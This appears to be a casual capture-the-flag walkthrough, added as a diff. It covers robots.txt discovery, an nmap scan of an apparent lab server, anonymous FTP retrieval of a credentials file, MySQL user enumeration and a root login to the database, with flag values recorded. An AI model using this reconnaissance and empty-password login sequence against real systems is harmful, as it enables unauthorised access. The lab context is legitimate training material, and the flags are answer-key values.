@@ -1,0 +1,91 @@
+in robots.txt u have 2 files disallow to get on:
+Disallow: /secret-info/
+Disallow: /data/
+date file error 404
+
+/secret-info/ there flag.txt file but its not able to open
+lets try get it by wget
+FLAG2_1feea10e28fe46dab6a5938a2ad4f2e2
+
+we may be need this too:
+User-agent: googlebot
+Disallow: /photos
+
+now we need to know if we target windows or linux by ping
+ip = 192.34.46.3
+its linux server
+
+now we start scan by nmap
+21/tcp    open  ftp      vsftpd 3.0.5
+ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-r--r--    1 0        0              22 Oct 28  2024 creds.txt
+|_-rw-r--r--    1 0        0              39 Jun 02 13:29 flag.txt
+
+nice we got 2 file on ftp and we can get it by anonymous user!!!
+
+22/tcp    open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+
+25/tcp    open  smtp     Postfix smtpd
+
+80/tcp    open  http     Werkzeug/3.0.6 Python/3.10.12
+_http-title: CTF Challenge
+|_http-server-header: Werkzeug/3.0.6 Python/3.10.12
+| fingerprint-strings:
+|   GetRequest:
+|     HTTP/1.1 200 OK
+|     Server: Werkzeug/3.0.6 Python/3.10.12
+|     Date: Mon, 02 Jun 2025 13:52:33 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 2557
+|     Server: FLAG1_2bc2612acc91445c933d8c365fe09524
+|     Connection: close
+143/tcp   open  imap     Dovecot imapd (Ubuntu)
+993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
+
+3306/tcp  open  mysql    MySQL 8.0.39-0ubuntu0.22.04.1
+ Capabilities flags: 65535
+|   Some Capabilities: ODBCClient, Speaks41ProtocolOld, LongPassword, LongColumnFlag, SupportsTransactions, ConnectWithDatabase, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, SupportsCompression, InteractiveClient, SupportsLoadDataLocal, Support41Auth, SwitchToSSLAfterHandshake, FoundRows, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
+Auth Plugin Name: caching_sha2_password
+33060/tcp open  mysqlx?
+
+
+ok after this much info lets try to use it
+
+i started with ftp and i got 2 files
+flag.txt => i got flag 3
+creds.txt => db_admin:password@123
+
+now we have admin passwd to mysql
+
+lets use nmap scripts on sqldb
+mysql-enum:
+|   Valid usernames:
+|     root:<empty> - Valid credentials
+|     netadmin:<empty> - Valid credentials
+|     guest:<empty> - Valid credentials
+|     user:<empty> - Valid credentials
+|     web:<empty> - Valid credentials
+|     sysadmin:<empty> - Valid credentials
+|     administrator:<empty> - Valid credentials
+|     webadmin:<empty> - Valid credentials
+|     admin:<empty> - Valid credentials
+|     test:<empty> - Valid credentials
+now we have much users to login
+mysql -h 192.168.1.100 -u root -p
+
+yesss we got into sqldate base
+MySQL [(none)]> show databases;
++----------------------------------------+
+| Database                               |
++----------------------------------------+
+| FLAG4_01b9f55db1414163b43260f26b265bcd |
+| information_schema                     |
+| mysql                                  |
+| performance_schema                     |
+| sys                                    |
++----------------------------------------+
+5 rows in set (0.001 sec)
+
+the last flag yessssssssssssssss
+
+note:first flag u will found in http header in nmap scan
